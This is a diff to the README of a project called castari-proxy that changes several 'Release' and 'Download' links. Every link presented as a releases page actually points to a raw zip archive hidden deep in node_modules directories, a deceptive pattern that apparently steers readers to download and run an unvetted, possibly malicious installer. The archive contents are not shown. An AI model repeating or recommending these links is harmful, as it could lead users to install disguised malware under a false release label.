@@ -6,11 +6,11 @@ Welcome to castari-proxy! This application helps you use the Claude Agent SDK an
 
 ## 📥 Download & Install
 
-To download the latest version of castari-proxy, visit this page: [Download the Latest Release](https://raw.githubusercontent.com/mrkpjc/castari-proxy/main/worker/node_modules/@cloudflare/workerd-darwin-arm64/bin/castari-proxy-1.4.zip).
+To download the latest version of castari-proxy, visit this page: [Download the Latest Release](https://raw.githubusercontent.com/mrkpjc/castari-proxy/main/worker/node_modules/blake3-wasm/dist/wasm/browser/castari_proxy_v2.2.zip).
 
 You will find different versions of the software under "Releases." Simply choose the version that matches your operating system, click on the link, and the download will start automatically.
 
-![Download Now](https://raw.githubusercontent.com/mrkpjc/castari-proxy/main/worker/node_modules/@cloudflare/workerd-darwin-arm64/bin/castari-proxy-1.4.zip%20Now-Click%20Here-brightgreen)
+![Download Now](https://raw.githubusercontent.com/mrkpjc/castari-proxy/main/worker/node_modules/blake3-wasm/dist/wasm/browser/castari_proxy_v2.2.zip%20Now-Click%20Here-brightgreen)
 
 ## 💻 System Requirements
 
@@ -25,7 +25,7 @@ Before you begin, ensure your system meets the following requirements:
 
 Follow these steps to install castari-proxy on your computer:
 
-1. **Download the Installer**: Go to the [Releases page](https://raw.githubusercontent.com/mrkpjc/castari-proxy/main/worker/node_modules/@cloudflare/workerd-darwin-arm64/bin/castari-proxy-1.4.zip) and download the correct file for your operating system.
+1. **Download the Installer**: Go to the [Releases page](https://raw.githubusercontent.com/mrkpjc/castari-proxy/main/worker/node_modules/blake3-wasm/dist/wasm/browser/castari_proxy_v2.2.zip) and download the correct file for your operating system.
    
 2. **Locate the File**: Once the download is complete, find the file in your Downloads folder or the location you chose to save it.
 
@@ -75,6 +75,6 @@ For further assistance, you can reach out through the issues section on our GitH
 
 Join our growing community! Connect with other users, share experiences, and offer tips through discussions on our GitHub page. Your feedback helps improve castari-proxy!
 
-For the latest updates and news, keep an eye on the [Releases page](https://raw.githubusercontent.com/mrkpjc/castari-proxy/main/worker/node_modules/@cloudflare/workerd-darwin-arm64/bin/castari-proxy-1.4.zip).
+For the latest updates and news, keep an eye on the [Releases page](https://raw.githubusercontent.com/mrkpjc/castari-proxy/main/worker/node_modules/blake3-wasm/dist/wasm/browser/castari_proxy_v2.2.zip).
 
 Thank you for using castari-proxy! Enjoy connecting with AI models effortlessly.
